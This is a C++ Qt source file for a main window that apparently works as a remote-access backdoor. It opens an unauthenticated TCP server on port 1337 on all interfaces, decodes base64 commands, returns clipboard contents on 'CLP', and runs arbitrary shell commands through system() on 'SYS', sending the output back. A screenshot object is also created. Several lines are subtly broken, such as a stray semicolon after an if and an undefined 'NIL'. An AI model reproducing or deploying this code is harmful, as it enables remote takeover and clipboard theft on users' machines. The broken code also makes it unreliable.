#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <cstdlib>



MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    this->networdHandler = NIL;
    this->serversocket = new QTcpServer(this);

    if(!this->serversocket->listen(QHostAddress::Any,1337));
    {
        qDebug() << "The server could not start";
    }
    connect(serversocket,SIGNAL(newConnection), this,SLOT(incommingConnection()));
    connect(serversocket, SIGNAL(read()), this, SLOT(read));

    QMimeData myMimeData;
    Screenshot *scshot = new Screenshot();

    /*while(true)
    {
        //QTest::qWait(1000);
        //usleep(10000);
        //qDebug() << "sleeping";
}
*/
//
}
void MainWindow::read(QTcpSocket *newsocket){

}
void MainWindow::incommingConnection()
{
QTcpSocket *newsocket = serversocket->nextPendingConnection();
QString returnStr= QByteArray::fromBase64(newsocket->readAll());
qDebug() << returnStr;
qDebug() << "Received Data";
if(returnStr.contains("CLP"))
{
        MainWindow::sendCmd(this->clippy->getclipboardString(),newsocket);
}
else if(returnStr.contains("SYS")) //SYS commands are here to receive command to pass to system and give back the return
{
    returnStr.remove(0,4);
    system(qPrintable(returnStr + ">> command.txt"));
    QFile *file = new QFile("command.txt");
    if(!file->open(QIODevice::ReadWrite))
    {
        qWarning("Couldn't save the file");
    }
    QTextStream in(file);
    QString output = in.readAll(); //have to read from a file, since system just returns 0 or exit message that are integers
    typeid("typeid is" + returnStr);
    MainWindow::sendCmd(output,newsocket);

}

this->networdHandler = NIL;
connect(newsocket,SIGNAL(readyRead()),this,SLOT(read(newsocket)));
}
void MainWindow::sendCmd(QString cmd,QTcpSocket *newsocket){ //taken from the server part, just gives back the answer here
  newsocket->write((cmd + "\n").toUtf8().toBase64());
  newsocket->flush();
}
MainWindow::~MainWindow()
{
    delete ui;
}

